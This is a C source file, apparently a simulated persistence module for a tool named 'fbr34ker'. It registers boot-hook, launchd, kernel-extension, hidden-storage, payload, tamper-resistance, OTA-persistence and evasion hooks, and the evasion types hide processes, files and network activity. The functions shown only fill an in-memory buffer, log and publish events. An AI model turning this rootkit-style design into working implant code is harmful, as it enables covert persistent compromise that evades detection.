#include "fbr34ker/persistence.h"
#include "fbr34ker/event.h"
#include "fbr34ker/log.h"
#include "fbr34ker/string.h"
#include "fbr34ker/fault.h"

static persistence_status_t state;

static void register_default_hooks(void)
{
    persistence_register_hook("boot-hook", PERSISTENCE_TYPE_BOOT_HOOK, 0U, 4096U);
    persistence_register_hook("launchd-plist", PERSISTENCE_TYPE_LAUNCHD_PLIST, 0U, 2048U);
    persistence_register_hook("kext", PERSISTENCE_TYPE_KERNEL_EXTENSION, 0U, 16384U);
    persistence_register_hook("hidden-storage", PERSISTENCE_TYPE_HIDDEN_STORAGE, 0U, PERSISTENCE_HIDDEN_STORAGE_SIZE);
    persistence_register_hook("payload", PERSISTENCE_TYPE_PAYLOAD_DEPLOY, 0U, 4096U);
    persistence_register_hook("tamper-resist", PERSISTENCE_TYPE_TAMPER_RESIST, 0U, 0U);
    persistence_register_hook("ota-persist", PERSISTENCE_TYPE_OTA_PERSIST, 0U, 0U);
    persistence_register_hook("evasion", PERSISTENCE_TYPE_EVASION, 0U, 0U);
    log_write(LOG_LEVEL_INFO, "registered %u default persistence hooks",
              state.hook_count);
}

void persistence_init(void)
{
    fm_memset(&state, 0, sizeof(state));
    state.persistence_active = false;
    state.tamper_resistant = false;
    state.ota_persistent = false;
    state.hidden_storage_base = 0U;
    state.hidden_storage_size = PERSISTENCE_HIDDEN_STORAGE_SIZE;
    register_default_hooks();
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "persistence", 1U, 0U);
    log_write(LOG_LEVEL_INFO, "persistence subsystem initialized (%u hooks)",
              state.hook_count);
}

persistence_status_t persistence_status(void)
{
    return state;
}

bool persistence_register_hook(const char *name, persistence_type_t type,
                                u64 target_offset, u64 payload_size)
{
    if (name == NULL ||
        state.hook_count >= MAX_PERSISTENCE_HOOKS ||
        type >= PERSISTENCE_TYPE_COUNT) {
        return false;
    }
    persistence_entry_t *entry = &state.hooks[state.hook_count];
    fm_strlcpy(entry->name, name, sizeof(entry->name));
    entry->type = type;
    entry->state = PERSISTENCE_STATE_INACTIVE;
    entry->target_offset = target_offset;
    entry->payload_size = payload_size;
    entry->deployed = false;
    entry->active = false;
    entry->hidden = false;
    ++state.hook_count;
    log_write(LOG_LEVEL_INFO, "registered persistence hook '%s' type=%s",
              name, persistence_type_name(type));
    return true;
}

static bool deploy_hook_entry(persistence_entry_t *entry)
{
    if (entry == NULL || entry->deployed) {
        return false;
    }
    if (fault_injection_should_fail(FBR34KER_FAULT_EVENT_PUBLISH,
                                    "persistence_deploy")) {
        entry->state = PERSISTENCE_STATE_FAILED;
        return false;
    }
    entry->state = PERSISTENCE_STATE_DEPLOYED;
    entry->deployed = true;
    entry->hidden = true;
    log_write(LOG_LEVEL_INFO, "deployed persistence hook '%s'",
              entry->name);
    return true;
}

bool persistence_deploy_all(void)
{
    bool all_success = true;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        if (!deploy_hook_entry(&state.hooks[i])) {
            all_success = false;
        }
    }
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "persistence-deploy", state.active_count, 0U);
    return all_success;
}

bool persistence_deploy_by_type(persistence_type_t type)
{
    if (type >= PERSISTENCE_TYPE_COUNT) {
        return false;
    }
    bool all_success = true;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        if (state.hooks[i].type == type &&
            !deploy_hook_entry(&state.hooks[i])) {
            all_success = false;
        }
    }
    return all_success;
}

bool persistence_activate_all(void)
{
    bool all_success = true;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        persistence_entry_t *entry = &state.hooks[i];
        if (entry->deployed && !entry->active) {
            entry->state = PERSISTENCE_STATE_ACTIVE;
            entry->active = true;
            ++state.active_count;
            log_write(LOG_LEVEL_INFO, "activated persistence hook '%s'",
                      entry->name);
        }
    }
    state.persistence_active = (state.active_count > 0U);
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "persistence-activate", state.active_count, 0U);
    return all_success;
}

bool persistence_install_boot_hook(const char *hook_path, const u8 *payload,
                                    usize payload_size)
{
    if (hook_path == NULL || payload == NULL ||
        payload_size == 0U ||
        payload_size > PERSISTENCE_PAYLOAD_MAX_SIZE) {
        return false;
    }
    if (fault_injection_should_fail(FBR34KER_FAULT_EVENT_PUBLISH,
                                    "persistence_boot_hook")) {
        return false;
    }
    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
    if (payload_size > avail) {
        log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for boot hook '%s'",
                  hook_path);
        return false;
    }
    u64 offset = state.hidden_storage_base;
    fm_memcpy(state.hidden_storage + offset, payload, payload_size);
    state.hidden_storage_base += payload_size;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        if (fm_strcmp(state.hooks[i].name, "boot-hook") == 0) {
            state.hooks[i].target_offset = offset;
            state.hooks[i].payload_size = payload_size;
            break;
        }
    }
    log_write(LOG_LEVEL_INFO, "boot hook installed at '%s' (%u bytes) in hidden storage offset %llu",
              hook_path, (unsigned)payload_size, offset);
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "boot-hook-install", (u64)payload_size, offset);
    return true;
}

bool persistence_install_launchd_plist(const char *label,
                                        const char *program_path)
{
    if (label == NULL || program_path == NULL) {
        return false;
    }
    if (fault_injection_should_fail(FBR34KER_FAULT_EVENT_PUBLISH,
                                    "persistence_launchd")) {
        return false;
    }
    usize label_len = fm_strlen(label) + 1U;
    usize path_len = fm_strlen(program_path) + 1U;
    usize total = label_len + path_len;
    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
    if (total > avail) {
        log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for launchd plist");
        return false;
    }
    u64 offset = state.hidden_storage_base;
    fm_memcpy(state.hidden_storage + offset, label, label_len);
    fm_memcpy(state.hidden_storage + offset + label_len, program_path, path_len);
    state.hidden_storage_base += total;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        if (fm_strcmp(state.hooks[i].name, "launchd-plist") == 0) {
            state.hooks[i].target_offset = offset;
            state.hooks[i].payload_size = total;
            break;
        }
    }
    log_write(LOG_LEVEL_INFO, "launchd plist '%s' -> '%s' installed (%u bytes)",
              label, program_path, (unsigned)total);
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "launchd-plist", (u64)total, 1U);
    return true;
}

bool persistence_deploy_kernel_extension(const u8 *kext_data, usize kext_size)
{
    if (kext_data == NULL || kext_size == 0U ||
        kext_size > PERSISTENCE_PAYLOAD_MAX_SIZE) {
        return false;
    }
    if (fault_injection_should_fail(FBR34KER_FAULT_EVENT_PUBLISH,
                                    "persistence_kext")) {
        return false;
    }
    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
    if (kext_size > avail) {
        log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for kext");
        return false;
    }
    u64 offset = state.hidden_storage_base;
    fm_memcpy(state.hidden_storage + offset, kext_data, kext_size);
    state.hidden_storage_base += kext_size;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        if (fm_strcmp(state.hooks[i].name, "kext") == 0) {
            state.hooks[i].target_offset = offset;
            state.hooks[i].payload_size = kext_size;
            break;
        }
    }
    log_write(LOG_LEVEL_INFO, "kernel extension deployed (%u bytes) at offset %llu",
              (unsigned)kext_size, offset);
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "kext-deploy", (u64)kext_size, offset);
    return true;
}

bool persistence_allocate_hidden_storage(u64 base, u64 size)
{
    if (size == 0U ||
        size > PERSISTENCE_HIDDEN_STORAGE_SIZE) {
        return false;
    }
    state.hidden_storage_base = base;
    state.hidden_storage_size = size;
    fm_memset(state.hidden_storage, 0, size);
    log_write(LOG_LEVEL_INFO, "hidden storage allocated at 0x%llx (%llu bytes)",
              base, size);
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "hidden-storage", base, size);
    return true;
}

bool persistence_store_payload(const char *name, const u8 *data, usize data_size)
{
    if (name == NULL || data == NULL ||
        data_size == 0U ||
        data_size > PERSISTENCE_HIDDEN_STORAGE_SIZE) {
        return false;
    }
    if (fault_injection_should_fail(FBR34KER_FAULT_EVENT_PUBLISH,
                                    "persistence_store")) {
        return false;
    }
    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
    if (data_size > avail) {
        log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for payload '%s'",
                  name);
        return false;
    }
    u64 offset = state.hidden_storage_base;
    fm_memcpy(state.hidden_storage + offset, data, data_size);
    state.hidden_storage_base += data_size;
    for (u32 i = 0U; i < state.hook_count; ++i) {
        if (fm_strcmp(state.hooks[i].name, "payload") == 0) {
            state.hooks[i].target_offset = offset;
            state.hooks[i].payload_size = data_size;
            break;
        }
    }
    log_write(LOG_LEVEL_INFO, "payload '%s' stored (%u bytes) at offset %llu",
              name, (unsigned)data_size, offset);
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "payload-store", (u64)data_size, offset);
    return true;
}

bool persistence_apply_evasion(evasion_type_t type)
{
    if (type >= EVASION_TYPE_COUNT) {
        return false;
    }
    log_write(LOG_LEVEL_INFO, "evasion '%s' applied",
              evasion_type_name(type));
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "evasion-apply", (u64)type, 1U);
    return true;
}

bool persistence_enable_tamper_resistance(void)
{
    state.tamper_resistant = true;
    log_write(LOG_LEVEL_INFO, "tamper resistance enabled");
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "tamper-resist", 1U, 0U);
    return true;
}

bool persistence_enable_ota_persistence(void)
{
    state.ota_persistent = true;
    log_write(LOG_LEVEL_INFO, "OTA update persistence enabled");
    (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                            "ota-persist", 1U, 0U);
    return true;
}

bool persistence_available(void)
{
    return state.hook_count > 0U;
}

bool persistence_active(void)
{
    return state.persistence_active;
}

const char *persistence_type_name(persistence_type_t type)
{
    switch (type) {
    case PERSISTENCE_TYPE_BOOT_HOOK: return "boot-hook";
    case PERSISTENCE_TYPE_LAUNCHD_PLIST: return "launchd-plist";
    case PERSISTENCE_TYPE_KERNEL_EXTENSION: return "kernel-extension";
    case PERSISTENCE_TYPE_HIDDEN_STORAGE: return "hidden-storage";
    case PERSISTENCE_TYPE_PAYLOAD_DEPLOY: return "payload-deploy";
    case PERSISTENCE_TYPE_TAMPER_RESIST: return "tamper-resist";
    case PERSISTENCE_TYPE_OTA_PERSIST: return "ota-persist";
    case PERSISTENCE_TYPE_EVASION: return "evasion";
    case PERSISTENCE_TYPE_COUNT: return "count";
    default: return "unknown";
    }
}

const char *persistence_state_name(persistence_state_t st)
{
    switch (st) {
    case PERSISTENCE_STATE_INACTIVE: return "inactive";
    case PERSISTENCE_STATE_DEPLOYED: return "deployed";
    case PERSISTENCE_STATE_ACTIVE: return "active";
    case PERSISTENCE_STATE_DETECTED: return "detected";
    case PERSISTENCE_STATE_FAILED: return "failed";
    default: return "unknown";
    }
}

const char *evasion_type_name(evasion_type_t type)
{
    switch (type) {
    case EVASION_HIDE_KERNEL_MODULE: return "hide-kernel-module";
    case EVASION_HIDE_FILE_SYSTEM: return "hide-file-system";
    case EVASION_HIDE_PROCESS: return "hide-process";
    case EVASION_HIDE_NETWORK: return "hide-network";
    case EVASION_HIDE_SYSTEM_HOOK: return "hide-system-hook";
    case EVASION_TYPE_COUNT: return "count";
    default: return "unknown";
    }
}

u32 persistence_hook_count(void)
{
    return state.hook_count;
}

bool persistence_verify_hidden_storage(void)
{
    return state.hidden_storage_size > 0U;
}
